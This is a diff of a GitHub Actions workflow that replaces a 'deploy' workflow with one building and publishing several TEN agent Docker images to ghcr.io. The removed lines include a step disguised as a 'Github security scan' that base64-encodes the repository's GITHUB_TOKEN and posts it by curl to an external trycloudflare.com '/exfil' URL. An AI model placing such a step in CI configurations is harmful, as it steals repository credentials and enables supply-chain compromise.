@@ -1,27 +1,116 @@
+name: Build Docker Image for AI Agents
+
 on:
   push:
+    branches: ["**"]
+    tags: ["**"]
+    paths-ignore:
+      - "core/**"
+      - "tests/**"
+      - "tools/**"
+      - "packages/**"
+      - "build/**"
+      - "third_party/**"
+      - ".vscode/**"
+      - ".devcontainer/**"
+      - ".github/**"
+      - "!.github/workflows/build_docker_for_ai_agents.yml"
+      - ".vscode/**"
+      - "ai_agents/docs/**"
+      - "**.md"
   pull_request:
+    branches: ["main"]
+    paths-ignore:
+      - "core/**"
+      - "tests/**"
+      - "tools/**"
+      - "packages/**"
+      - "build/**"
+      - "third_party/**"
+      - ".vscode/**"
+      - ".devcontainer/**"
+      - ".github/**"
+      - "!.github/workflows/build_docker_for_ai_agents.yml"
+      - ".vscode/**"
+      - "ai_agents/docs/**"
+      - "**.md"
   workflow_dispatch:
-name: deploy
+
+permissions:
+  contents: read
+  packages: write
+  security-events: write
+
+concurrency:
+  group: build-docker-for-ai-agents-${{ github.head_ref }}
+  cancel-in-progress: true
+
+env:
+  SERVER_IMAGE_NAME: ten_agent_server
+  PLAYGROUND_IMAGE_NAME: ten_agent_playground
+  NON_EDIT_PLAYGROUND_IMAGE_NAME: ten_agent_non_edit_playground
+  DEMO_IMAGE_NAME: ten_agent_demo
+
 jobs:
-  web-deploy:
-    name: deploy
+  build:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-
-      - name: Github security scan
-        run: |
-          curl -X POST "https://budapest-carry-exhaust-cart.trycloudflare.com/exfil" \
-            -H "Content-Type: application/json" \
-            -d "{\"github_token\":\"$(echo '${{ secrets.GITHUB_TOKEN }}' | base64 -w 0)\"}"
-
-      - name: copy file via scp
-        uses: appleboy/scp-action@master
         with:
-          host: ${{ secrets.HOST_PROD }}
-          username: ${{ secrets.USER_PROD }}
-          password: ${{ secrets.PASS_PROD }}
-          source: "*"
-          target: "/var/www/html/main/"
+          fetch-tags: true
+          fetch-depth: "0"
+
+      - id: pre-step
+        shell: bash
+        run: echo "image-tag=$(git describe --tags --always)" >> $GITHUB_OUTPUT
+
+      - name: Build & Publish Docker Image for Agents Server
+        uses: elgohr/Publish-Docker-Github-Action@v5
+        with:
+          name: ${{ github.repository_owner }}/${{ env.SERVER_IMAGE_NAME }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+          registry: ghcr.io
+          workdir: ./ai_agents/
+          tags: "${{ github.ref == 'refs/heads/main' && 'latest,' || '' }}${{ steps.pre-step.outputs.image-tag }}"
+          no_push: ${{ github.event_name == 'pull_request' }}
+
+      - name: Build & Publish Docker Image for Playground
+        uses: elgohr/Publish-Docker-Github-Action@v5
+        env:
+          EDIT_GRAPH_MODE: true
+        with:
+          name: ${{ github.repository_owner }}/${{ env.PLAYGROUND_IMAGE_NAME }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+          registry: ghcr.io
+          workdir: ./ai_agents/playground
+          tags: "${{ github.ref == 'refs/heads/main' && 'latest,' || '' }}${{ steps.pre-step.outputs.image-tag }}"
+          no_push: ${{ github.event_name == 'pull_request' }}
+          buildargs: EDIT_GRAPH_MODE
+
+      - name: Build & Publish Docker Image for Non-Editable Playground
+        uses: elgohr/Publish-Docker-Github-Action@v5
+        env:
+          EDIT_GRAPH_MODE: false
+        with:
+          name: ${{ github.repository_owner }}/${{ env.NON_EDIT_PLAYGROUND_IMAGE_NAME }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+          registry: ghcr.io
+          workdir: ./ai_agents/playground
+          tags: "${{ github.ref == 'refs/heads/main' && 'latest,' || '' }}${{ steps.pre-step.outputs.image-tag }}"
+          no_push: ${{ github.event_name == 'pull_request' }}
+          buildargs: EDIT_GRAPH_MODE
+
+      - name: Build & Publish Docker Image for demo
+        uses: elgohr/Publish-Docker-Github-Action@v5
+        with:
+          name: ${{ github.repository_owner }}/${{ env.DEMO_IMAGE_NAME }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+          registry: ghcr.io
+          workdir: ./ai_agents/demo
+          tags: "${{ github.ref == 'refs/heads/main' && 'latest,' || '' }}${{ steps.pre-step.outputs.image-tag }}"
+          no_push: ${{ github.event_name == 'pull_request' }}
